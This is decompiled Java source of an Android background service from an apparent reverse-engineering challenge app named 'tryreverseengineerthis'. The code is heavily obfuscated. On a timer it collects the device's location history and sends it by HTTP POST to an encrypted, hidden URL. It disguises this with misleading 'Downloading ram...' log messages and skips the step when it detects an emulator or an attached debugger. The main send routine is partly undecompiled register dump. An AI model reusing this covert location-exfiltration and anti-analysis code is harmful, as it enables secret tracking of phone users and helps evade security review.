package com.woop.tryreverseengineerthis;

import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.os.Debug;
import android.os.IBinder;
import android.util.Log;
import com.google.android.gms.fitness.FitnessStatusCodes;
import java.security.InvalidKeyException;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;
import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;

/* renamed from: com.woop.tryreverseengineerthis.N */
public class C0600N extends Service {
    private static Timer f18xa64f2084;
    String f19x4faff8c8;

    /* renamed from: com.woop.tryreverseengineerthis.N.1 */
    class C05991 extends TimerTask {
        C05991() {
        }

        public void run() {
            if (C0600N.L1L1L1L1L1L1L1(234)) {
                C0592E.L1L1L1L1L1L1L().L1L1L1L1L1L1L1L();
            } else if (!C0600N.this.l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1()) {
                C0600N.this.l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l();
            }
        }
    }

    public C0600N() {
        this.f19x4faff8c8 = "-780232329";
    }

    static {
        f18xa64f2084 = null;
    }

    private static boolean L1L1L1L1L1L1L1(int O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1) {
        if ((((double) O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1) / 2.0d) % 2.0d != 1.0d) {
            return true;
        }
        return false;
    }

    public IBinder onBind(Intent O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O1O) {
        return null;
    }

    public void onCreate() {
        Log.d("NothingToSeeHere", "Downloading ram...");
        Log.d("NothingToSeeHere", "Downloading ram...");
        Log.d("NothingToSeeHere", "Downloading ram...");
        f18xa64f2084 = new Timer();
        f18xa64f2084.scheduleAtFixedRate(new C05991(), 0, (long) FitnessStatusCodes.NEEDS_OAUTH_PERMISSIONS);
    }

    private void l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l() {
    }

    private boolean l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1() {
        List<Location> L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1 = C0595H.m17x7249ad12();
        StringBuilder L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L = new StringBuilder();
        if (C0600N.L1L1L1L1L1L1L1(754)) {
            C0592E.L1L1L1L1L1L1L().L1L1L1L1L1L1L1L();
        }
        for (Location loc : L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1) {
            L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.append(loc.getAltitude());
            L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.append(",");
            L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.append(loc.getLatitude());
            L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.append(",");
            L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.append(loc.getLongitude());
            L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.append(",");
            L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.append(loc.getTime());
            L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.append(",");
            L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.append("||");
        }
        l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l(L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.toString());
        if (L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.length() <= 2 && L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L.equals(L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L)) {
            return true;
        }
        return false;
    }

    /* JADX WARNING: inconsistent code. */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    @android.annotation.TargetApi(19)
    private void l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l(java.lang.String r22) {
        /*
        r21 = this;
        r2 = "d102jd012jasd";
        r3 = "uas0j1d12dasDas";
        r4 = "aspdk2DasdmaSDa==";
        r5 = "as=sdnasd2d22d2";
        r6 = "ask20asdj20jd9";
        r7 = "asdSDs22d@d222==";
        r8 = "20k20dk20ASD2d==";
        r2 = com.woop.tryreverseengineerthis.C0596I.m23xa430057e(r2);	 Catch:{ IllegalBlockSizeException -> 0x009a, BadPaddingException -> 0x009d, InvalidKeyException -> 0x00a0, Exception -> 0x00a3, MalformedURLException -> 0x00af, IOException -> 0x00b5 }
        r3 = com.woop.tryreverseengineerthis.C0596I.m23xa430057e(r3);	 Catch:{ IllegalBlockSizeException -> 0x009a, BadPaddingException -> 0x009d, InvalidKeyException -> 0x00a0, Exception -> 0x00a3, MalformedURLException -> 0x00af, IOException -> 0x00b5 }
        r4 = com.woop.tryreverseengineerthis.C0596I.m23xa430057e(r4);	 Catch:{ IllegalBlockSizeException -> 0x009a, BadPaddingException -> 0x009d, InvalidKeyException -> 0x00a0, Exception -> 0x00a3, MalformedURLException -> 0x00af, IOException -> 0x00b5 }
        r5 = com.woop.tryreverseengineerthis.C0596I.m23xa430057e(r5);	 Catch:{ IllegalBlockSizeException -> 0x009a, BadPaddingException -> 0x009d, InvalidKeyException -> 0x00a0, Exception -> 0x00a3, MalformedURLException -> 0x00af, IOException -> 0x00b5 }
        r6 = com.woop.tryreverseengineerthis.C0596I.m23xa430057e(r6);	 Catch:{ IllegalBlockSizeException -> 0x009a, BadPaddingException -> 0x009d, InvalidKeyException -> 0x00a0, Exception -> 0x00a3, MalformedURLException -> 0x00af, IOException -> 0x00b5 }
        r7 = com.woop.tryreverseengineerthis.C0596I.m23xa430057e(r7);	 Catch:{ IllegalBlockSizeException -> 0x009a, BadPaddingException -> 0x009d, InvalidKeyException -> 0x00a0, Exception -> 0x00a3, MalformedURLException -> 0x00af, IOException -> 0x00b5 }
        r8 = com.woop.tryreverseengineerthis.C0596I.m23xa430057e(r8);	 Catch:{ IllegalBlockSizeException -> 0x009a, BadPaddingException -> 0x009d, InvalidKeyException -> 0x00a0, Exception -> 0x00a3, MalformedURLException -> 0x00af, IOException -> 0x00b5 }
        r14 = new java.net.URL;	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r14.<init>(r2);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r19 = java.nio.charset.StandardCharsets.UTF_8;	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r0 = r22;
        r1 = r19;
        r15 = r0.getBytes(r1);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r16 = r14.openConnection();	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r16 = (java.net.HttpURLConnection) r16;	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r19 = 1;
        r0 = r16;
        r1 = r19;
        r0.setDoOutput(r1);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r19 = 0;
        r0 = r16;
        r1 = r19;
        r0.setInstanceFollowRedirects(r1);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r0 = r16;
        r0.setRequestMethod(r3);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r0 = r16;
        r0.setRequestProperty(r4, r5);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r0 = r16;
        r0.setRequestProperty(r6, r7);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r0 = r15.length;	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r19 = r0;
        r19 = java.lang.Integer.toString(r19);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r0 = r16;
        r1 = r19;
        r0.setRequestProperty(r8, r1);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r19 = 0;
        r0 = r16;
        r1 = r19;
        r0.setUseCaches(r1);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r17 = new java.io.DataOutputStream;	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r19 = r16.getOutputStream();	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r0 = r17;
        r1 = r19;
        r0.<init>(r1);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        r20 = 0;
        r0 = r17;
        r0.write(r15);	 Catch:{ Throwable -> 0x00b7 }
        if (r17 == 0) goto L_0x0092;
    L_0x008d:
        if (r20 == 0) goto L_0x00b1;
    L_0x008f:
        r17.close();	 Catch:{ Throwable -> 0x00a6 }
    L_0x0092:
        r19 = "NothingToSeeHere";
        r20 = "Downloading ram...";
        android.util.Log.d(r19, r20);
    L_0x0099:
        return;
    L_0x009a:
        r13 = move-exception;
        r9 = 1;
        goto L_0x0099;
    L_0x009d:
        r13 = move-exception;
        r12 = 1;
        goto L_0x0099;
    L_0x00a0:
        r13 = move-exception;
        r11 = 1;
        goto L_0x0099;
    L_0x00a3:
        r13 = move-exception;
        r10 = 1;
        goto L_0x0099;
    L_0x00a6:
        r18 = move-exception;
        r0 = r20;
        r1 = r18;
        r0.addSuppressed(r1);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        goto L_0x0092;
    L_0x00af:
        r13 = move-exception;
        goto L_0x0099;
    L_0x00b1:
        r17.close();	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        goto L_0x0092;
    L_0x00b5:
        r13 = move-exception;
        goto L_0x0099;
    L_0x00b7:
        r20 = move-exception;
        throw r20;	 Catch:{ all -> 0x00b9 }
    L_0x00b9:
        r19 = move-exception;
        if (r17 == 0) goto L_0x00c1;
    L_0x00bc:
        if (r20 == 0) goto L_0x00cd;
    L_0x00be:
        r17.close();	 Catch:{ Throwable -> 0x00c4 }
    L_0x00c1:
        throw r19;	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
    L_0x00c2:
        r13 = move-exception;
        goto L_0x0099;
    L_0x00c4:
        r18 = move-exception;
        r0 = r20;
        r1 = r18;
        r0.addSuppressed(r1);	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        goto L_0x00c1;
    L_0x00cd:
        r17.close();	 Catch:{ MalformedURLException -> 0x00af, IOException -> 0x00b5, Exception -> 0x00c2 }
        goto L_0x00c1;
        */
        throw new UnsupportedOperationException("Method not decompiled: com.woop.tryreverseengineerthis.N.l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l(java.lang.String):void");
    }

    private boolean l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1() {
        Log.d("NothingToSeeHere", "Downloading ram...");
        boolean l1l1 = false;
        if (C0600N.L1L1L1L1L1L1L1(858)) {
            C0592E.L1L1L1L1L1L1L().L1L1L1L1L1L1L1L();
        } else if (l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l()) {
            l1l1 = l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1();
        }
        Log.d("NothingToSeeHere", "Downloading ram...");
        l1l1 ^= l1l1;
        if (!l1l1) {
            return ((l1l1 ^ l1l1) ^ l1l1) ^ l1l1;
        }
        int i;
        if (l1l1 == l1l1) {
            i = 1;
        } else {
            i = 0;
        }
        return i ^ l1l1;
    }

    private boolean l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l() {
        Log.d("NothingToSeeHere", "Downloading ram...");
        String l1l1l1 = C0597J.L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1(0);
        String l1l1l1l = C0597J.L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1(1);
        String l1l1l1l1 = C0597J.L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1(2);
        String l1l1l1l1l = C0597J.L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1(3);
        String l1l1l1l1l1 = C0597J.L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1(4);
        String l1l1l1l1l1l = C0597J.L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1(5);
        String l1l1l1l1l1l1 = C0597J.L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1(6);
        String l1l1l1l1l1l1l = C0597J.L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1(7);
        String l1l1l1l1l1l1l1 = C0597J.L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1(8);
        String l1l1l1l1l1l1l1l = C0597J.L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1(9);
        String l1l1l1l1l1l1l1l1 = C0597J.L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1L1(10);
        String l1l1l1l1l1l1l1l1l = "T05FMTExMTExMTExMQ==";
        String l1l1l1l1l1l1l1l1l1 = "VFdPMjIyMjIyMjIyMg==";
        String l1l1l1l1l1l1l1l1l1l = "VEhSRUUzMzMzMzMzMw==";
        String l1l1l1l1l1l1l1l1l1l1 = "Rk9VUjQ0NDQ0NDQ0NA==";
        String l1l1l1l1l1l1l1l1l1l1l = "RklWRTU1NTU1NTU1NQ==";
        String l1l1l1l1l1l1l1l1l1l1l1 = "RUxWRU4xMTExMTExMQ==";
        try {
            l1l1l1 = C0596I.m23xa430057e(l1l1l1);
            l1l1l1l = C0596I.m23xa430057e(l1l1l1l);
            l1l1l1l1 = C0596I.m23xa430057e(l1l1l1l1);
            l1l1l1l1l = C0596I.m23xa430057e(l1l1l1l1l);
            l1l1l1l1l1 = C0596I.m23xa430057e(l1l1l1l1l1);
            l1l1l1l1l1l = C0596I.m23xa430057e(l1l1l1l1l1l);
            l1l1l1l1l1l1 = C0596I.m23xa430057e(l1l1l1l1l1l1);
            l1l1l1l1l1l1l = C0596I.m23xa430057e(l1l1l1l1l1l1l);
            l1l1l1l1l1l1l1 = C0596I.m23xa430057e(l1l1l1l1l1l1l1);
            l1l1l1l1l1l1l1l = C0596I.m23xa430057e(l1l1l1l1l1l1l1l);
            l1l1l1l1l1l1l1l1 = C0596I.m23xa430057e(l1l1l1l1l1l1l1l1);
            l1l1l1l1l1l1l1l1l = C0596I.m22xe4439d13(l1l1l1l1l1l1l1l1l);
            l1l1l1l1l1l1l1l1l1 = C0596I.m22xe4439d13(l1l1l1l1l1l1l1l1l1);
            l1l1l1l1l1l1l1l1l1l = C0596I.m22xe4439d13(l1l1l1l1l1l1l1l1l1l);
            l1l1l1l1l1l1l1l1l1l1 = C0596I.m22xe4439d13(l1l1l1l1l1l1l1l1l1l1);
            l1l1l1l1l1l1l1l1l1l1l = C0596I.m22xe4439d13(l1l1l1l1l1l1l1l1l1l1l);
            l1l1l1l1l1l1l1l1l1l1l1 = C0596I.m22xe4439d13(l1l1l1l1l1l1l1l1l1l1l1);
            boolean z = l1l1l1l1l1l1l1l1l.startsWith(l1l1l1) || l1l1l1l1l1l1l1l1l.startsWith(l1l1l1l);
            Boolean l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1 = Boolean.valueOf(z);
            z = l1l1l1l1l1l1l1l1l1.contains(l1l1l1l1) || l1l1l1l1l1l1l1l1l1.contains(l1l1l1l1l) || l1l1l1l1l1l1l1l1l1.contains(l1l1l1l1l1);
            Boolean l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l = Boolean.valueOf(z);
            z = l1l1l1l1l1l1l1l1l1l.contains(l1l1l1l1l1l) || l1l1l1l1l1l1l1l1l1l.contains(l1l1l1l);
            Boolean l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1 = Boolean.valueOf(z);
            z = l1l1l1l1l1l1l1l1l1l1.contains(l1l1l1l1l1l1) || l1l1l1l1l1l1l1l1l1l1.contains(l1l1l1l1l1l1l1);
            Boolean l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l = Boolean.valueOf(z);
            z = l1l1l1l1l1l1l1l1l1l1l.contains(l1l1l1l1l1l1l1l) || l1l1l1l1l1l1l1l1l1l1l.contains(l1l1l1l1l1l1l1);
            Boolean l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1 = Boolean.valueOf(z);
            if (C0600N.L1L1L1L1L1L1L1(114)) {
                C0592E.L1L1L1L1L1L1L().L1L1L1L1L1L1L1L();
            } else if (l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1.booleanValue() || l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l.booleanValue() || l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1.booleanValue() || l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l.booleanValue() || l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1l1.booleanValue()) {
                return false;
            }
            if (C0600N.L1L1L1L1L1L1L1(858)) {
                C0592E.L1L1L1L1L1L1L().L1L1L1L1L1L1L1L();
            } else if (l1l1l1l1l1l1l1l1.equals(l1l1l1l1l1l1l1l1l1l1l1)) {
                return false;
            }
            if (C0600N.L1L1L1L1L1L1L1(1158)) {
                C0592E.L1L1L1L1L1L1L().L1L1L1L1L1L1L1L();
            } else if (Debug.isDebuggerConnected()) {
                return false;
            }
            Log.d("TAG", "WORKING");
            return true;
        } catch (IllegalBlockSizeException e) {
            return false;
        } catch (BadPaddingException e2) {
            return false;
        } catch (InvalidKeyException e3) {
            return false;
        } catch (Exception e4) {
            return false;
        }
    }
}
